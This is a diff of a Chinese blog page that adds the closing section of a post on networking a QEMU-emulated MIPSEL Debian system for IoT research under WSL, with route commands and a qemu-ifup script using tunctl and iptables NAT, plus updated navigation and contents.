+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route add default via 192.168.2.1</span><br></pre></td></tr></table></figure>
+
+<p>这样应该可以联网了 (but<code>WSL</code>不行)</p>
+<p>不愧是之前学网络的，研究了半天发现，<code>qemu</code>出去的包是没有问题的，但是一旦出去了<code>WSL</code>网络，就回不来，那么真相只有一个！</p>
+<p><code>windows</code>没有对应的路由！！！！！！！</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.2.0 mask 255.255.255.0 172.20.96.1</span><br></pre></td></tr></table></figure>
+
+<p>这里自己需要对应修改<code>qemu</code>的网段，以及<code>wsl</code>的网关，就是<code>windows</code>连<code>wsl</code>的<code>ip</code>地址</p>
+<img src="/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/image-20240312114709689.png" class="" title="image-20240312114709689">
+
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>可以直接在<code>qemu</code>的启动脚本上配置网络</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/qemu-ifup</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tunctl -u root -t <span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> sudo <span class="built_in">chmod</span> 0666 /dev/net/tun</span><br><span class="line"><span class="built_in">chmod</span> 0666 /dev/net/tun</span><br><span class="line"></span><br><span class="line">ifconfig tap0 192.168.2.1 up</span><br><span class="line">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br></pre></td></tr></table></figure>
+
+
     </article>
     <!-- license -->
     
@@ -549,13 +587,13 @@
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2024/02/26/2024VNCTF-PWN/" title="2024VNCTF--PWN">
-                    <div class="nextTitle">2024VNCTF--PWN</div>
-                </a>
-            
         </li>
         <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/02/26/2024VNCTF-PWN/" title="2024VNCTF--PWN">
+                    <div class="prevTitle">2024VNCTF--PWN</div>
+                </a>
             
         </li>
     </ul>
@@ -694,7 +732,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.1.</span> <span class="toc-text">main函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">保护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2gadget"><span class="toc-number">1.2.</span> <span class="toc-text">搜索gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb%E6%89%BE%E5%81%8F%E7%A7%BB"><span class="toc-number">2.0.1.</span> <span class="toc-text">gdb找偏移</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">坑点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">3.</span> <span class="toc-text">EXP</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DDDD"><span class="toc-number">1.</span> <span class="toc-text">DDDD</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8qemu%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.1.</span> <span class="toc-text">为什么要用qemu模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E4%B8%8A%E5%B8%B8%E8%A7%81%E7%9A%84qemu%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.2.</span> <span class="toc-text">网上常见的qemu模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.3.</span> <span class="toc-text">安装系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E5%BF%85%E8%A6%81%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.1.</span> <span class="toc-text">下载系统必要文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%A3%81%E7%9B%98"><span class="toc-number">1.3.2.</span> <span class="toc-text">创建磁盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-Debian-MIPSEL"><span class="toc-number">1.3.3.</span> <span class="toc-text">安装 Debian MIPSEL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-bootloader"><span class="toc-number">1.3.4.</span> <span class="toc-text">安装 bootloader</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">提取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98"><span class="toc-number">1.3.4.1.1.</span> <span class="toc-text">挂载磁盘</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E5%8F%96"><span class="toc-number">1.3.4.1.2.</span> <span class="toc-text">提取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%96%E6%B6%88%E6%8C%82%E8%BD%BD"><span class="toc-number">1.3.4.1.3.</span> <span class="toc-text">取消挂载</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">1.4.</span> <span class="toc-text">正式启动虚拟机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C"><span class="toc-number">1.5.</span> <span class="toc-text">配置网络</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%B7%A5%E5%85%B7"><span class="toc-number">1.5.1.</span> <span class="toc-text">安装工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E5%BC%A0%E8%99%9A%E6%8B%9FTUN%E7%BD%91%E5%8D%A1"><span class="toc-number">1.5.2.</span> <span class="toc-text">创建一张虚拟TUN网卡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE%E4%B8%BA%E4%BB%BB%E4%BD%95%E4%BA%BA%E9%83%BD%E6%9C%89%E6%9D%83%E9%99%90%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">将网卡设置为任何人都有权限使用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEip%E5%9C%B0%E5%9D%80"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">设置ip地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%BC%80%E5%90%AFIP%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BD%AC%E5%8F%91"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">为虚拟机开启IP数据包转发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E5%9C%A8%E6%88%91%E4%BB%AC%E7%9A%84%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.5.3.</span> <span class="toc-text">现在我们的启动脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A7%BD%E7%82%B9"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">槽点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">1.5.4.</span> <span class="toc-text">最后</span></a></li></ol></li></ol></li></ol>
             </div>
         
         <!-- sidebar -->
